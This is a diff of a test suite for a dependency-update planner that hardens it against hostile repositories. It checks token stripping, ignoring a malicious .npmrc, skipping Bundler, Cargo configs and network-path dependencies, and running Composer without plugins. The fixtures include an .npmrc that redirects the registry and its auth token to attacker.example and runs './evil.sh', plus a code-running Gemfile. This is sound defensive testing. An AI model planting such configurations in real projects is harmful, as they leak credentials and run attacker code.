@@ -1572,20 +1572,28 @@ describe('deps_audit', () => {
 describe('deps_update_plan', () => {
   // Review 8, finding 4: execa's own `timeout` signalled npm.cmd's cmd.exe
   // and then waited on the node it started. The runner's kills the tree.
-  it('runs npm outdated through the runner, with its timeout and the project as cwd — and a timeout is a runner failure', async () => {
+  it('runs npm outdated through the runner, with its timeout, on a copy of the manifests — and a timeout is a runner failure', async () => {
     const project = tempProject();
-    writeFileSync(join(project, 'package.json'), JSON.stringify({ dependencies: { lodash: '^4.17.0' } }), 'utf8');
+    const manifest = JSON.stringify({ dependencies: { lodash: '^4.17.0' } });
+    writeFileSync(join(project, 'package.json'), manifest, 'utf8');
+    writeFileSync(join(project, 'package-lock.json'), '{"lockfileVersion":3,"packages":{}}', 'utf8');
     const plugin = makePlugin(project);
-    vi.mocked(runProcess).mockImplementation(async (opts) =>
-      bare(opts.command) === 'npm'
-        ? { outcome: 'timed_out', exitCode: null, stdout: '', stderr: '', truncated: false }
-        : { outcome: 'completed', exitCode: 0, stdout: '', stderr: '', truncated: false },
-    );
+    let seen: { manifest: string; lock: boolean } | null = null;
+    vi.mocked(runProcess).mockImplementation(async (opts) => {
+      if (bare(opts.command) !== 'npm') return { outcome: 'completed', exitCode: 0, stdout: '', stderr: '', truncated: false };
+      const cwd = opts.cwd ?? '';
+      seen = { manifest: readFileSync(join(cwd, 'package.json'), 'utf8'), lock: existsSync(join(cwd, 'package-lock.json')) };
+      return { outcome: 'timed_out', exitCode: null, stdout: '', stderr: '', truncated: false };
+    });
     const r = okResult<{ runner_failures: Array<{ ecosystem: string; code: string; reason: string }> }>(
       await getTool('deps_update_plan').handler({ project_path: project }, plugin),
     );
     const npm = vi.mocked(runProcess).mock.calls.map(([o]) => o).find((o) => bare(o.command) === 'npm');
-    expect(npm).toMatchObject({ args: ['outdated', '--json'], cwd: project, timeoutMs: 60_000, extendEnv: false });
+    expect(npm).toMatchObject({ args: ['outdated', '--json'], timeoutMs: 60_000, extendEnv: false });
+    expect(npm?.cwd).not.toBe(project);
+    expect(seen).toEqual({ manifest, lock: true });
+    // The copy is the run's own, and gone after it.
+    expect(existsSync(npm?.cwd ?? '')).toBe(false);
     expect(npm?.gitHardening).toBeUndefined();
     expect(r.runner_failures).toEqual([expect.objectContaining({ ecosystem: 'npm', reason: expect.stringMatching(/timed out after 60000 ms/) })]);
   });
@@ -2029,13 +2037,15 @@ describe('deps_update_plan', () => {
     expect(r.plan[0]?.follow_up_command).toBe('npm install --ignore-scripts');
   });
 
-  it('defaults to a real npm install (never overrides-only) when package.json cannot be read', async () => {
+  it('defaults to a real npm install (never overrides-only) when package.json names no dependencies', async () => {
     // An overrides-only step never touches node_modules/package-lock.json —
     // reproduced against a genuine Trivy scan (see this file's own history):
     // guessing "transitive" when directness is unknown can leave a CVE
     // completely unfixed. A real `npm install` is the safe default either way.
+    // (A package.json that is not JSON no longer gets this far: npm outdated
+    // is not run on a manifest whose sources could not be checked — below.)
     const project = tempProject();
-    writeFileSync(join(project, 'package.json'), 'not valid json{{{', 'utf8');
+    writeFileSync(join(project, 'package.json'), '{"name":"x"}', 'utf8');
     const plugin = makePlugin(project);
     seedCve(plugin, project, {
       cve_id: 'CVE-2024-4',
@@ -3602,7 +3612,7 @@ describe('deps_update_plan', () => {
     const r = okResult<{ plan: Array<{ package_name: string; installed_version: string; latest_version: string }>; runner_failures: unknown[] }>(
       await getTool('deps_update_plan').handler({ project_path: project }, plugin),
     );
-    expect(calls).toContain('composer outdated --locked --format=json');
+    expect(calls).toContain('composer outdated --locked --format=json --no-plugins');
     expect(r.plan).toEqual([expect.objectContaining({ package_name: 'psr/log', installed_version: '1.0.0', latest_version: '3.0.2' })]);
     expect(r.runner_failures).toEqual([]);
   });
@@ -3621,19 +3631,125 @@ describe('deps_update_plan', () => {
     expect(r.runner_failures).toEqual([expect.objectContaining({ ecosystem: 'composer', reason: expect.stringContaining('No dependencies installed') })]);
   });
 
-  it('Task 11 fix round 1: a Ruby step only re-locks (bundle lock --update) — never bundle update, which installs gems into the host', async () => {
-    const project = tempProject();
-    writeFileSync(join(project, 'Gemfile'), "source 'https://rubygems.org'\ngem 'rack'\n", 'utf8');
-    const plugin = makePlugin(project);
-    vi.mocked(runProcess).mockImplementation(pm(async (cmd: string) => {
-      if (bare(cmd) === 'bundle') return { exitCode: 1, stdout: 'rack (newest 3.1.8, installed 2.2.3)\n', stderr: '' };
-      return { exitCode: 0, stdout: '', stderr: '' };
-    }));
-    const r = okResult<{ plan: Array<{ package_name: string; upgrade_command: string }> }>(
-      await getTool('deps_update_plan').handler({ project_path: project }, plugin),
-    );
-    const rack = r.plan.find((s) => s.package_name === 'rack');
-    expect(rack?.upgrade_command).toBe('bundle lock --update rack');
+  describe("a hostile repository's own configuration (review of 3.6, finding 2)", () => {
+    type Plan = {
+      plan: Array<{ package_name: string; upgrade_command: string }>;
+      unplanned: Array<{ package_name: string; ecosystem: string; reason: string }>;
+      runner_failures: Array<{ ecosystem: string; code: string; reason: string }>;
+      package_config_not_read?: string[];
+    };
+    const started = (): string[] => vi.mocked(runProcess).mock.calls.map(([o]) => bare(o.command));
+
+    it('never hands a package manager a token from the server environment', async () => {
+      const project = tempProject();
+      writeFileSync(join(project, 'package.json'), '{"name":"x","dependencies":{"lodash":"4.17.20"}}', 'utf8');
+      writeFileSync(join(project, 'composer.json'), JSON.stringify({ require: { 'psr/log': '1.0.0' } }), 'utf8');
+      writeFileSync(join(project, 'go.mod'), 'module example.com/x\n\ngo 1.21\n', 'utf8');
+      vi.mocked(runProcess).mockImplementation(pm(async () => ({ exitCode: 0, stdout: '', stderr: '' })));
+      const before = process.env['GITHUB_TOKEN'];
+      process.env['GITHUB_TOKEN'] = 'ghp_server_token_never_forwarded';
+      try {
+        await getTool('deps_update_plan').handler({ project_path: project }, makePlugin(project));
+      } finally {
+        if (before === undefined) delete process.env['GITHUB_TOKEN'];
+        else process.env['GITHUB_TOKEN'] = before;
+      }
+      const calls = vi.mocked(runProcess).mock.calls.map(([o]) => o);
+      expect(calls.map((o) => bare(o.command)).sort()).toEqual(['composer', 'go', 'npm']);
+      for (const o of calls) {
+        expect(o.extendEnv, bare(o.command)).toBe(false);
+        expect(o.env?.['GITHUB_TOKEN'], bare(o.command)).toBeUndefined();
+        expect(o.env?.['PATH'] ?? o.env?.['Path'], bare(o.command)).toBeDefined();
+      }
+    });
+
+    it("plans npm without the repository's .npmrc, and says so", async () => {
+      const project = tempProject();
+      writeFileSync(join(project, 'package.json'), '{"name":"x","dependencies":{"lodash":"4.17.20"}}', 'utf8');
+      writeFileSync(join(project, '.npmrc'), 'registry=https://attacker.example/\n//attacker.example/:_authToken=${NPM_TOKEN}\ngit=./evil.sh\n', 'utf8');
+      let npmrcBesideIt: boolean | null = null;
+      vi.mocked(runProcess).mockImplementation(async (opts) => {
+        if (bare(opts.command) === 'npm') npmrcBesideIt = existsSync(join(opts.cwd ?? project, '.npmrc'));
+        return { outcome: 'completed', exitCode: 0, stdout: '{}', stderr: '', truncated: false };
+      });
+      const r = okResult<Plan>(await getTool('deps_update_plan').handler({ project_path: project }, makePlugin(project)));
+      expect(npmrcBesideIt).toBe(false);
+      expect(r.package_config_not_read).toEqual(['.npmrc']);
+    });
+
+    it('does not run npm outdated where a dependency points at a network path, or package.json is not JSON', async () => {
+      for (const manifest of ['{"name":"x","dependencies":{"p":"file:\\\\\\\\host\\\\share\\\\p"}}', 'not valid json{{{']) {
+        vi.mocked(runProcess).mockReset();
+        const project = tempProject();
+        writeFileSync(join(project, 'package.json'), manifest, 'utf8');
+        vi.mocked(runProcess).mockImplementation(pm(async () => ({ exitCode: 0, stdout: '{}', stderr: '' })));
+        const r = okResult<Plan>(await getTool('deps_update_plan').handler({ project_path: project }, makePlugin(project)));
+        expect(started(), manifest).not.toContain('npm');
+        expect(r.runner_failures, manifest).toEqual([
+          expect.objectContaining({ ecosystem: 'npm', code: 'network_path_chosen_by_project' }),
+        ]);
+      }
+    });
+
+    it('runs Composer without plugins', async () => {
+      const project = tempProject();
+      writeFileSync(join(project, 'composer.json'), JSON.stringify({ require: { 'psr/log': '1.0.0' } }), 'utf8');
+      vi.mocked(runProcess).mockImplementation(pm(async () => ({ exitCode: 0, stdout: '{"locked":[]}', stderr: '' })));
+      await getTool('deps_update_plan').handler({ project_path: project }, makePlugin(project));
+      const composer = vi.mocked(runProcess).mock.calls.map(([o]) => o).find((o) => bare(o.command) === 'composer');
+      expect(composer?.args).toContain('--no-plugins');
+    });
+
+    it('never runs Bundler — the Gemfile is Ruby code — and still reports the CVE Gemfile.lock pins', async () => {
+      const project = tempProject();
+      writeFileSync(join(project, 'Gemfile'), "File.write('PWNED', 'x')\nsource 'https://rubygems.org'\ngem 'rack'\n", 'utf8');
+      writeFileSync(
+        join(project, 'Gemfile.lock'),
+        ['GEM', '  remote: https://rubygems.org/', '  specs:', '    rack (2.2.3)', '', 'PLATFORMS', '  ruby', ''].join('\n'),
+        'utf8',
+      );
+      const plugin = makePlugin(project);
+      seedCve(plugin, project, { cve_id: 'CVE-RACK', package_name: 'rack', installed_version: '2.2.3', fixed_version: '2.2.8' });
+      vi.mocked(runProcess).mockImplementation(pm(async () => ({ exitCode: 1, stdout: 'rack (newest 3.1.8, installed 2.2.3)\n', stderr: '' })));
+      const r = okResult<Plan>(await getTool('deps_update_plan').handler({ project_path: project }, plugin));
+      expect(started()).not.toContain('bundle');
+      expect(r.plan.some((s) => s.upgrade_command.startsWith('bundle'))).toBe(false);
+      expect(r.runner_failures).toEqual([
+        expect.objectContaining({ ecosystem: 'rubygems', code: 'gemfile_is_code', reason: expect.stringContaining('Ruby code') }),
+      ]);
+      expect(r.unplanned).toEqual([expect.objectContaining({ package_name: 'rack', ecosystem: 'rubygems' })]);
+    });
+
+    it("does not run cargo where the repository has its own Cargo configuration or a toolchain path", async () => {
+      const plan = async (files: Record<string, string>): Promise<{ r: Plan; ran: boolean }> => {
+        vi.mocked(runProcess).mockReset();
+        const root = tempProject();
+        mkdirSync(join(root, '.git'));
+        const project = join(root, 'crates', 'app');
+        mkdirSync(project, { recursive: true });
+        writeFileSync(join(project, 'Cargo.toml'), '[package]\nname = "app"\nversion = "0.1.0"\n', 'utf8');
+        for (const [rel, text] of Object.entries(files)) {
+          mkdirSync(dirname(join(root, rel)), { recursive: true });
+          writeFileSync(join(root, rel), text, 'utf8');
+        }
+        vi.mocked(runProcess).mockImplementation(pm(async () => ({ exitCode: 0, stdout: '{"dependencies":[]}', stderr: '' })));
+        const r = okResult<Plan>(await getTool('deps_update_plan').handler({ project_path: project }, makePlugin(project)));
+        return { r, ran: started().includes('cargo') };
+      };
+      // At the repository root, above the crate: Cargo reads it there too.
+      const config = await plan({ '.cargo/config.toml': '[alias]\noutdated = "run"\n' });
+      expect(config.ran).toBe(false);
+      expect(config.r.runner_failures).toEqual([
+        expect.objectContaining({ ecosystem: 'cargo', code: 'repository_cargo_config', reason: expect.stringContaining('../../.cargo/config.toml') }),
+      ]);
+      const toolchainPath = await plan({ 'crates/app/rust-toolchain.toml': '[toolchain]\npath = "./tools/evil"\n' });
+      expect(toolchainPath.ran).toBe(false);
+      expect(toolchainPath.r.runner_failures[0]?.reason).toContain('rust-toolchain.toml');
+      // A channel is a toolchain rustup installs: planned as before.
+      const channel = await plan({ 'rust-toolchain.toml': '[toolchain]\nchannel = "1.80.0"\n' });
+      expect(channel.ran).toBe(true);
+      expect(channel.r.runner_failures).toEqual([]);
+    });
   });
 
   it('Task 11 item 9: with no .git above it, a stray pnpm/yarn lock in an unrelated ancestor does not flip an npm project', async () => {
